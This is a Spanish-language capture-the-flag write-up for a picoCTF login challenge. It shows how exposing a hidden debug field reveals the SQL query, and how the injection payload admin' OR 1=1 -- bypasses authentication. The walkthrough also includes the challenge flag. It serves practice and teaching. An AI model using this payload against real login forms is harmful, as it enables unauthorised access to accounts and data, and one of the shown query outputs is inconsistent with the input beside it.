## Descripción
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
## Pistas
There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?

Try to think about how the website verifies your login.
## Solución 1
Inspeccionando el HTML vemos un campo oculto
```html
<input type="hidden" name="debug" value="0">
```
Cambiando el valor por 1, el sitio nos arroja la secuencia SQL que utiliza para el Login
```
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
```
Por lo que podemos cerrar la comilla de admin antes, e insertar una operación que siempre resulte verdadera.
```
username: admin' OR 1=1 --
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
```
Por lo que podemos loguearnos y obtener la bandera
```
username: admin' OR 1=1 --
password: admin
SQL query: SELECT * FROM users WHERE name='admin' OR 1=1 --' AND password='admin'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
```
## Notas adicionales

## Referencias
